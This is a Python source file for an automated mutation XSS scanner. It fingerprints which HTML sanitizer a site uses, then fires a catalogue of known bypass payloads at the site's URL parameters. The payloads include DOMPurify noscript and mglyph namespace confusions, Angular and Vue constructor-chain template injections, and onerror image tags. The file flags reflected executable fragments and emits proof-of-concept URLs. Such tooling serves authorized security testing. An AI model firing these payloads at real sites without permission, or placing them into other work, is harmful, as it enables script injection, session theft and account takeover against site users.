"""Mutation XSS scanner — sanitizer detection and parser differentials."""

from __future__ import annotations

import re
from dataclasses import dataclass, field

import httpx


# Payloads keyed by sanitizer. Each exploits a known parser differential.
MUTATION_PAYLOADS: dict[str, list[str]] = {
    "dompurify": [
        # Classic noscript parser differential
        '<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">',
        # math/mglyph namespace confusion
        "<math><mtext></table><mglyph><style></math><img src=x onerror=alert(document.domain)>",
        # SVG foreignObject
        "<svg><style>&lt;/style&gt;<img src=x onerror=alert(document.domain)></svg>",
        # Template tag differential
        "<template><script>alert(document.domain)</script></template>",
        # form action bypass
        '<form action="javascript:alert(document.domain)"><input type=submit>',
    ],
    "angular": [
        # Template injection via constructor chain
        "{{constructor.constructor('alert(document.domain)')()}}",
        "{{$on.constructor('alert(document.domain)')()}}",
        # ng-bind-html with bypassSecurityTrust
        "<div ng-app ng-csp><input ng-focus=\"$event.target.ownerDocument.defaultView.alert(1)\">",
    ],
    "vue": [
        # v-html without sanitization
        "<div v-html=\"'<img src=x onerror=alert(document.domain)>'\"></div>",
        # Expression in template string
        "{{_c.constructor('alert(document.domain)')()}}",
    ],
    "sanitize-html": [
        # Recursive parsing
        "<img src=1 href=1 onerror=alert(document.domain)>",
        "<div><math><mi><b><mglyph><img src=x onerror=alert(document.domain)>",
    ],
    "generic": [
        # Comment parsing differential
        "<!--><img src=x onerror=alert(document.domain)>",
        # style closing differential
        "<style></p><img src=x onerror=alert(document.domain)></style>",
        # RCDATA differential
        "<textarea></textarea><img src=x onerror=alert(document.domain)>",
        # Null byte
        "<scri\x00pt>alert(document.domain)</scri\x00pt>",
        # Double encoding
        "&lt;img src=x onerror=alert(document.domain)&gt;",
        # XML namespace confusion
        "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.domain)</script></svg>",
    ],
}

# Fingerprinting patterns for sanitizers
SANITIZER_SIGNATURES: list[tuple[str, str]] = [
    # (regex pattern in headers/body, sanitizer name)
    (r"DOMPurify", "dompurify"),
    (r"dompurify", "dompurify"),
    (r"ng-version|angular\.js|@angular", "angular"),
    (r"vue\.js|vue\.min\.js|__vue__", "vue"),
    (r"sanitize-html", "sanitize-html"),
    (r"xss-filters|xssfilter", "xss-filters"),
    (r"marked\.js|marked\.min", "marked"),
    (r"bleach", "bleach"),
]


@dataclass
class SanitizerInfo:
    name: str  # dompurify | angular | vue | sanitize-html | generic | unknown
    version: str = ""
    confidence: str = "low"  # low | medium | high
    evidence: str = ""


@dataclass
class MutationFinding:
    type: str = "mutation"
    url: str = ""
    param: str = ""
    payload: str = ""
    sanitizer: str = ""
    differential: str = ""
    poc: str = ""
    severity: str = "P1"
    evidence: str = ""


class MutationXSS:
    """Detects mutation XSS via sanitizer fingerprinting and parser differentials."""

    def __init__(self, target_url: str, session: httpx.Client | None = None):
        self.target_url = target_url
        self.session = session or httpx.Client(
            timeout=30,
            follow_redirects=True,
            headers={"User-Agent": "XSSHunter/2.0"},
        )

    def scan(self, params: dict[str, str] | None = None) -> list[MutationFinding]:
        """Detect sanitizer then test relevant mutation payloads."""
        try:
            resp = self.session.get(self.target_url, params=params or {})
            resp.raise_for_status()
        except Exception:
            return []

        sanitizer = self.detect_sanitizer(resp)
        payloads = self.generate_mutation_payloads(sanitizer)
        findings: list[MutationFinding] = []

        for param in (params or {"q": ""}).keys():
            for payload in payloads:
                result = self._probe(param, payload, sanitizer)
                if result:
                    findings.append(result)

        return findings

    def detect_sanitizer(self, resp: httpx.Response) -> SanitizerInfo:
        """Identify which sanitizer is in use from response body and headers."""
        combined = resp.text + str(resp.headers)
        for pattern, name in SANITIZER_SIGNATURES:
            match = re.search(pattern, combined, re.IGNORECASE)
            if match:
                version = self._extract_version(combined, name)
                return SanitizerInfo(
                    name=name,
                    version=version,
                    confidence="high" if name in ("dompurify", "angular", "vue") else "medium",
                    evidence=match.group(0),
                )
        return SanitizerInfo(name="generic", confidence="low")

    def generate_mutation_payloads(self, sanitizer: SanitizerInfo) -> list[str]:
        """Return payloads targeting the detected sanitizer, plus generic fallbacks."""
        specific = MUTATION_PAYLOADS.get(sanitizer.name, [])
        generic = MUTATION_PAYLOADS["generic"]
        # Prioritize specific payloads; append generic ones not already included
        combined = specific + [p for p in generic if p not in specific]
        return combined

    def detect_parser_differential(self, payload: str, sanitized_output: str) -> bool:
        """Check if sanitized output still contains executable fragments."""
        executable_tokens = ["onerror=", "onload=", "ontoggle=", "onfocus=", "javascript:", "alert("]
        return any(token in sanitized_output.lower() for token in executable_tokens)

    def _probe(self, param: str, payload: str, sanitizer: SanitizerInfo) -> MutationFinding | None:
        try:
            resp = self.session.get(self.target_url, params={param: payload})
            resp.raise_for_status()
        except Exception:
            return None

        if self.detect_parser_differential(payload, resp.text):
            evidence = self._snippet(resp.text, payload)
            return MutationFinding(
                url=str(resp.url),
                param=param,
                payload=payload,
                sanitizer=sanitizer.name,
                differential=f"Parser survived sanitizer: {sanitizer.name}",
                poc=f"{self.target_url}?{param}={payload}",
                severity="P1",
                evidence=evidence,
            )
        return None

    def _extract_version(self, text: str, sanitizer: str) -> str:
        patterns = {
            "dompurify": r"DOMPurify[\s@]+(\d+\.\d+[\.\d]*)",
            "angular": r"ng-version=['\"]([^'\"]+)['\"]|Angular[\s/]+([\d.]+)",
            "vue": r"Vue\.version\s*=\s*['\"]([^'\"]+)['\"]",
        }
        pattern = patterns.get(sanitizer, "")
        if pattern:
            m = re.search(pattern, text, re.IGNORECASE)
            if m:
                return next(g for g in m.groups() if g)
        return ""

    def _snippet(self, text: str, value: str, radius: int = 80) -> str:
        idx = text.find(value)
        if idx < 0:
            return text[:radius * 2].replace("\n", "\\n")
        return text[max(0, idx - radius): idx + len(value) + radius].replace("\n", "\\n")
